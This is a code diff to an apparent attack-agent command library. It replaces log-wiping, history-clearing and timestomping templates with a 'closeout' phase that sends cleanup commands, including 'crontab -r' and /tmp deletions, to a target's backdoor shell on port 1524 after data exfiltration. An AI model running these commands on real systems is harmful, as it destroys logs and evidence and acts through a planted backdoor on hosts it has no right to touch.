@@ -20,6 +20,7 @@ class AttackPhase(Enum):
     LATERAL_MOVEMENT = auto()      # Move between systems
     EXFILTRATION = auto()          # Data extraction and persistence
     POST_EXPLOITATION = auto()     # Cleanup, persistence, covering tracks
+    CLOSEOUT = auto()              # Phase 6.6: Restore target, remove artifacts, generate report
 
 
 @dataclass
@@ -1318,91 +1319,69 @@ register(CommandTemplate(
 
 
 # =============================================================================
-# PHASE 6.5: POST-OP CLEANUP — Deleting digital traces
+# PHASE 6.6: CLOSEOUT — Restore target, remove OUR artifacts, generate report
+# Enterprise-grade: undo what we planted, leave target stable, produce receipts.
+# NO log wiping, NO timestomping, NO anti-forensics.
 # =============================================================================
 
 register(CommandTemplate(
-    name="clear_bash_history",
-    template="history -c && rm -f /root/.bash_history /home/*/.bash_history && unset HISTFILE",
-    description="Clear bash history and disable history logging. Remove traces of commands run.",
-    phase=AttackPhase.POST_EXPLOITATION,
-    required_params=[],
-    preconditions={"shell_obtained"},
-    success_indicators=[""],
-    typical_reward=6.0,
-    tags={"cleanup", "stealth", "traces", "linux"}
-))
-
-register(CommandTemplate(
-    name="clear_auth_logs",
-    template="echo '' > /var/log/auth.log && echo '' > /var/log/wtmp && echo '' > /var/log/btmp && echo '' > /var/log/lastlog",
-    description="Clear authentication logs. Remove login/logout traces from system.",
-    phase=AttackPhase.POST_EXPLOITATION,
-    required_params=[],
-    preconditions={"root_shell_obtained"},
-    success_indicators=[""],
-    typical_reward=8.0,
-    tags={"cleanup", "stealth", "logs", "linux"}
-))
-
-register(CommandTemplate(
-    name="clear_syslog",
-    template="echo '' > /var/log/syslog && echo '' > /var/log/messages && echo '' > /var/log/kern.log",
-    description="Clear system logs. Remove kernel and syslog traces of activity.",
-    phase=AttackPhase.POST_EXPLOITATION,
-    required_params=[],
-    preconditions={"root_shell_obtained"},
-    success_indicators=[""],
-    typical_reward=7.0,
-    tags={"cleanup", "stealth", "syslog", "linux"}
-))
-
-register(CommandTemplate(
     name="remove_uploaded_tools",
-    template="find /tmp /dev/shm /var/tmp -newer /etc/passwd -type f -exec rm -f {{}} \\; 2>/dev/null",
-    description="Remove recently uploaded attack tools from temp directories.",
-    phase=AttackPhase.POST_EXPLOITATION,
-    required_params=[],
-    preconditions={"shell_obtained"},
-    success_indicators=[""],
-    typical_reward=6.0,
-    tags={"cleanup", "stealth", "tools", "linux"}
+    template="{ echo 'find /tmp /dev/shm /var/tmp -newer /etc/passwd -type f -exec rm -f {} \\; 2>/dev/null && echo CLOSEOUT_TOOLS_REMOVED'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Remove attack tools we uploaded to temp directories. Undo our artifacts.",
+    phase=AttackPhase.CLOSEOUT,
+    required_params=["target"],
+    preconditions={"shell_obtained", "data_exfiltrated"},
+    success_indicators=["CLOSEOUT_TOOLS_REMOVED"],
+    typical_reward=8.0,
+    tags={"closeout", "restore", "tools", "linux"}
 ))
 
 register(CommandTemplate(
     name="remove_ssh_keys_planted",
-    template="sed -i '/attacker/d' /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2>/dev/null",
-    description="Remove planted SSH keys from authorized_keys files.",
-    phase=AttackPhase.POST_EXPLOITATION,
-    required_params=[],
-    preconditions={"shell_obtained"},
-    success_indicators=[""],
-    typical_reward=6.0,
-    tags={"cleanup", "stealth", "ssh", "persistence", "linux"}
+    template="{ echo 'sed -i \"/attacker/d\" /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2>/dev/null && echo CLOSEOUT_KEYS_REMOVED'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Remove SSH keys we planted in authorized_keys. Undo our persistence.",
+    phase=AttackPhase.CLOSEOUT,
+    required_params=["target"],
+    preconditions={"shell_obtained", "data_exfiltrated"},
+    success_indicators=["CLOSEOUT_KEYS_REMOVED"],
+    typical_reward=8.0,
+    tags={"closeout", "restore", "ssh", "persistence", "linux"}
 ))
 
 register(CommandTemplate(
     name="remove_cron_backdoors",
-    template="crontab -r 2>/dev/null; find /var/spool/cron -newer /etc/passwd -exec rm -f {{}} \\;",
-    description="Remove cron-based persistence mechanisms.",
-    phase=AttackPhase.POST_EXPLOITATION,
-    required_params=[],
-    preconditions={"root_shell_obtained"},
-    success_indicators=[""],
-    typical_reward=6.0,
-    tags={"cleanup", "stealth", "cron", "persistence", "linux"}
+    template="{ echo 'crontab -r 2>/dev/null; find /var/spool/cron -newer /etc/passwd -exec rm -f {} \\; && echo CLOSEOUT_CRON_REMOVED'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Remove cron-based persistence we installed. Undo our scheduled tasks.",
+    phase=AttackPhase.CLOSEOUT,
+    required_params=["target"],
+    preconditions={"root_shell_obtained", "data_exfiltrated"},
+    success_indicators=["CLOSEOUT_CRON_REMOVED"],
+    typical_reward=8.0,
+    tags={"closeout", "restore", "cron", "persistence", "linux"}
 ))
 
 register(CommandTemplate(
-    name="timestomp_evidence",
-    template="find /tmp /var/log -newer /etc/passwd -exec touch -r /etc/passwd {{}} \\;",
-    description="Reset timestamps on modified files to match system files, hiding evidence of modification.",
-    phase=AttackPhase.POST_EXPLOITATION,
-    required_params=[],
-    preconditions={"root_shell_obtained"},
-    success_indicators=[""],
-    typical_reward=7.0,
-    tags={"cleanup", "stealth", "timestomp", "forensics", "linux"}
+    name="verify_target_stable",
+    template="{ echo 'uptime && ps aux | wc -l && df -h / | tail -1 && echo TARGET_STABLE_VERIFIED'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Verify target system is stable after our engagement. Check uptime, processes, disk.",
+    phase=AttackPhase.CLOSEOUT,
+    required_params=["target"],
+    preconditions={"shell_obtained", "data_exfiltrated"},
+    success_indicators=["TARGET_STABLE_VERIFIED"],
+    typical_reward=10.0,
+    tags={"closeout", "verify", "health", "linux"}
+))
+
+register(CommandTemplate(
+    name="cleanup_tmp_artifacts",
+    template="{ echo 'rm -f /tmp/ariaska_* /tmp/payload_* /tmp/exploit_* /dev/shm/.* 2>/dev/null && echo CLOSEOUT_TMP_CLEANED'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Remove temporary artifacts created during engagement from /tmp and /dev/shm.",
+    phase=AttackPhase.CLOSEOUT,
+    required_params=["target"],
+    preconditions={"shell_obtained", "data_exfiltrated"},
+    success_indicators=["CLOSEOUT_TMP_CLEANED"],
+    typical_reward=8.0,
+    tags={"closeout", "restore", "tmp", "linux"}
 ))
 
 
@@ -2672,7 +2651,15 @@ def get_phase_from_state(state: Dict[str, Any]) -> AttackPhase:
     if not has_exfil:
         return AttackPhase.POST_EXPLOITATION
     
-    return AttackPhase.EXFILTRATION
+    # CLOSEOUT requires closeout actions completed (artifacts removed, target verified)
+    has_closeout = (
+        state.get("closeout_completed")
+        or state.get("artifacts_removed")
+    )
+    if not has_closeout:
+        return AttackPhase.EXFILTRATION
+    
+    return AttackPhase.CLOSEOUT
 
 
 def get_commands_by_tag(tag: str) -> List[CommandTemplate]:
